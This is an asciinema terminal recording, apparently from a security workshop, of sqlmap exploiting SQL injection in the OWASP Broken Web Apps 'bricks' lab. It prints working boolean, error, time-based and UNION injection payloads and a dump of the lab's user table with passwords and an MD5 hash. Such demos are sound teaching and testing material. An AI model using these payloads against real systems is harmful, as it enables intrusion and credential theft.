@@ -1,0 +1,350 @@
+{
+  "width": 183,
+  "height": 46,
+  "version": 1,
+  "title": "Union sql injection exploitation avec sqlmap",
+  "env": {
+    "TERM": "xterm-256color",
+    "SHELL": "/bin/bash"
+  },
+  "stdout": [
+    [
+      0.029649,
+      "\u001b]0;root@kali: ~/workshop-secu\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/workshop-secu\u001b[00m# "
+    ],
+    [
+      1.179505,
+      "sqlmap -u \"http://owaspbwa/owaspbricks/content-1/index.php?id=0\" -D bricks -T users --dump"
+    ],
+    [
+      1.024221,
+      "\r\n"
+    ],
+    [
+      0.509018,
+      "\u001b[01;33m        ___\r\n       __H__\r\n ___ ___[\u001b[01;41m,\u001b[01;49m]_____ ___ ___  \u001b[01;37m{\u001b[01;90m1.1.4#stable\u001b[01;37m}\u001b[01;33m\r\n|_ -| . [\u001b[01;41m(\u001b[01;49m]     | .'| . |\r\n|___|_  [\u001b[01;41m)\u001b[01;49m]_|_|_|__,|  _|\r\n      |_|V          |_|   \u001b[0m\u001b[4;37mhttp://sqlmap.org\u001b[0m\r\n\r\n"
+    ],
+    [
+      0.003381,
+      "[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\r\n\r\n[*] starting at 21:29:25\r\n\r\n"
+    ],
+    [
+      0.103568,
+      "\r\u001b[32m[21:29:25] [INFO] resuming back-end DBMS 'mysql' \u001b[0m\r\n"
+    ],
+    [
+      0.000463,
+      "\r\u001b[32m[21:29:25] [INFO] testing connection to the target URL\u001b[0m\r\n"
+    ],
+    [
+      0.062121,
+      "sqlmap resumed the following injection point(s) from stored session:\r\n---\r\nParameter: id (GET)\r\n    Type: boolean-based blind\r\n    Title: MySQL >= 5.0 boolean-based blind - Parameter replace\r\n    Payload: id=(SELECT (CASE WHEN (2763=2763) THEN 2763 ELSE 2763*(SELECT 2763 FROM INFORMATION_SCHEMA.PLUGINS) END))\r\n\r\n    Type: error-based\r\n    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\r\n    Payload: id=0 AND (SELECT 3397 FROM(SELECT COUNT(*),CONCAT(0x716b717071,(SELECT (ELT(3397=3397,1))),0x7178787871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)\r\n\r\n    Type: AND/OR time-based blind\r\n    Title: MySQL >= 5.0.12 AND time-based blind\r\n    Payload: id=0 AND SLEEP(5)\r\n\r\n    Type: UNION query\r\n    Title: Generic UNION query (NULL) - 8 columns\r\n    Payload: id=-8708 UNION ALL SELECT CONCAT(0x716b717071,0x45624253664e71484573676c474a4c7a6d66434678505073775a654c534b5a4b535549636c437545,0x7178787871),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ISpe\r\n---\r\n"
+    ],
+    [
+      0.001596,
+      "\u001b[32m\u001b[1m\r[21:29:25] [INFO] the back-end DBMS is MySQL\u001b[0m\u001b[0m\r\n"
+    ],
+    [
+      0.000341,
+      "web server operating system: Linux Ubuntu 10.04 (Lucid Lynx)\r\nweb application technology: PHP 5.3.2, Apache 2.2.14\r\nback-end DBMS: MySQL >= 5.0\r\n"
+    ],
+    [
+      0.001176,
+      "\r\u001b[32m[21:29:25] [INFO] fetching columns for table 'users' in database 'bricks'\u001b[0m\r\n"
+    ],
+    [
+      0.007229,
+      "\r\u001b[32m[21:29:25] [INFO] the SQL query used returns 8 entries\u001b[0m\r\n"
+    ],
+    [
+      0.005511,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"idusers\",\"int(11)\"\r\n\u001b[0m"
+    ],
+    [
+      0.000344,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"name\",\"varchar(45)\"\r\n\u001b[0m"
+    ],
+    [
+      0.00031,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"email\",\"varchar(45)\"\r\n\u001b[0m"
+    ],
+    [
+      0.000306,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"password\",\"varchar(45)\"\r\n\u001b[0m"
+    ],
+    [
+      0.000308,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"ua\",\"varchar(45)\"\r\n\u001b[0m"
+    ],
+    [
+      0.000324,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"ref\",\"varchar(145)\"\r\n\u001b[0m"
+    ],
+    [
+      0.000293,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"host\",\"varchar(45)\"\r\n\u001b[0m"
+    ],
+    [
+      0.000418,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"lang\",\"varchar(45)\"\r\n\u001b[0m"
+    ],
+    [
+      0.008691,
+      "\r                                                                                                                                                                                      \r"
+    ],
+    [
+      0.001055,
+      "\r\u001b[32m[21:29:25] [INFO] fetching entries for table 'users' in database 'bricks'\u001b[0m\r\n"
+    ],
+    [
+      0.004623,
+      "\r\u001b[32m[21:29:25] [INFO] the SQL query used returns 4 entries\u001b[0m\r\n"
+    ],
+    [
+      0.000487,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"admin@getmantra.com\",\"127.0.0.1\",\"0\",\"en\",\"admin\",\"admin\",\"http://owaspbwa/bricks/content-13/index.php\",\"Brick_Browser\"\r\n\u001b[0m"
+    ],
+    [
+      0.000407,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"tom@getmantra.com\",\"8.8.8.8\",\"1\",\"en\",\"tom\",\"tom\",\"\",\"Block_Browser\"\r\n\u001b[0m"
+    ],
+    [
+      0.000384,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"ron@getmantra.com\",\"192.168.1.1\",\"2\",\"en\",\"ron\",\"ron\",\"\",\"Rain_Browser\"\r\n\u001b[0m"
+    ],
+    [
+      0.004567,
+      "\u001b[32m[21:29:25] [INFO] resumed: \"harry@getmantra.com\",\"127.0.0.1\",\"3\",\"en\",\"harry\",\"5f4dcc3b5aa765d61d8327deb882cf99\",\"\",\"Mantra\"\r\n\u001b[0m\r                                                                                                                                                                                      \r"
+    ],
+    [
+      0.000712,
+      "\r\u001b[32m[21:29:25] [INFO] analyzing table dump for possible password hashes\u001b[0m\r\n"
+    ],
+    [
+      0.003374,
+      "\r\u001b[32m[21:29:25] [INFO] recognized possible password hashes in column 'password'\u001b[0m\r\n"
+    ],
+    [
+      4.9e-05,
+      "\u001b[1m\rdo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] \u001b[0m"
+    ],
+    [
+      2.0,
+      "\r\n\u001b[1m\rdo you want to crack them via a dictionary-based attack? [Y/n/q] \u001b[0m"
+    ],
+    [
+      2.0,
+      "n"
+    ],
+    [
+      0.329639,
+      "\r\nDatabase: bricks\r\nTable: users\r\n"
+    ],
+    [
+      0.000131,
+      "[4 entries]\r\n"
+    ],
+    [
+      0.000212,
+      "+---------+---------------+---------------------------------------------+------+-------+-------------+---------------------+----------------------------------+\r\n"
+    ],
+    [
+      0.000865,
+      "| idusers "
+    ],
+    [
+      0.000146,
+      "| ua            "
+    ],
+    [
+      0.000354,
+      "| ref                                         "
+    ],
+    [
+      0.000372,
+      "| lang "
+    ],
+    [
+      0.000657,
+      "| name  "
+    ],
+    [
+      8.7e-05,
+      "| host        "
+    ],
+    [
+      0.000279,
+      "| email               "
+    ],
+    [
+      0.000335,
+      "| password                         "
+    ],
+    [
+      0.000314,
+      "|\r\n+---------+---------------+---------------------------------------------+------+-------+-------------+---------------------+----------------------------------+\r\n"
+    ],
+    [
+      0.00046,
+      "| 0       "
+    ],
+    [
+      0.000116,
+      "| Brick_Browser "
+    ],
+    [
+      0.00028,
+      "| http://owaspbwa/bricks/content-13/index.php "
+    ],
+    [
+      0.000181,
+      "| en   "
+    ],
+    [
+      0.000247,
+      "| admin "
+    ],
+    [
+      0.000175,
+      "| 127.0.0.1   "
+    ],
+    [
+      0.000268,
+      "| admin@getmantra.com "
+    ],
+    [
+      0.000142,
+      "| admin                            "
+    ],
+    [
+      0.000261,
+      "|\r\n"
+    ],
+    [
+      0.000161,
+      "| 1       "
+    ],
+    [
+      0.000305,
+      "| Block_Browser "
+    ],
+    [
+      9.2e-05,
+      "| <blank>                                     "
+    ],
+    [
+      0.000375,
+      "| en   "
+    ],
+    [
+      0.000222,
+      "| tom   "
+    ],
+    [
+      0.000507,
+      "| 8.8.8.8     | tom@getmantra.com   "
+    ],
+    [
+      0.000193,
+      "| tom                              "
+    ],
+    [
+      0.0002,
+      "|\r\n"
+    ],
+    [
+      0.000253,
+      "| 2       "
+    ],
+    [
+      0.000175,
+      "| Rain_Browser  "
+    ],
+    [
+      0.000186,
+      "| <blank>                                     "
+    ],
+    [
+      0.000217,
+      "| en   "
+    ],
+    [
+      0.000197,
+      "| ron   "
+    ],
+    [
+      0.000281,
+      "| 192.168.1.1 "
+    ],
+    [
+      0.000304,
+      "| ron@getmantra.com   "
+    ],
+    [
+      0.000124,
+      "| ron                              "
+    ],
+    [
+      0.000212,
+      "|\r\n"
+    ],
+    [
+      0.000199,
+      "| 3       "
+    ],
+    [
+      0.000254,
+      "| Mantra        "
+    ],
+    [
+      0.000148,
+      "| <blank>                                     "
+    ],
+    [
+      0.000573,
+      "| en   "
+    ],
+    [
+      0.000257,
+      "| harry "
+    ],
+    [
+      0.000204,
+      "| 127.0.0.1   "
+    ],
+    [
+      0.000252,
+      "| harry@getmantra.com "
+    ],
+    [
+      0.000202,
+      "| 5f4dcc3b5aa765d61d8327deb882cf99 "
+    ],
+    [
+      0.000263,
+      "|\r\n"
+    ],
+    [
+      0.000107,
+      "+---------+---------------+---------------------------------------------+------+-------+-------------+---------------------+----------------------------------+\r\n\r\n"
+    ],
+    [
+      0.001465,
+      "\r\u001b[32m[21:29:31] [INFO] table 'bricks.users' dumped to CSV file '/root/.sqlmap/output/owaspbwa/dump/bricks/users.csv'\u001b[0m\r\n"
+    ],
+    [
+      0.000673,
+      "\r\u001b[32m[21:29:31] [INFO] fetched data logged to text files under '/root/.sqlmap/output/owaspbwa'\u001b[0m\r\n"
+    ],
+    [
+      0.000228,
+      "\r\n[*] shutting down at 21:29:31\r\n\r\n"
+    ],
+    [
+      0.011933,
+      "\u001b]0;root@kali: ~/workshop-secu\u0007\u001b[01;31mroot@kali\u001b[00m:\u001b[01;34m~/workshop-secu\u001b[00m# "
+    ]
+  ],
+  "command": null,
+  "duration": 7.314508
+}
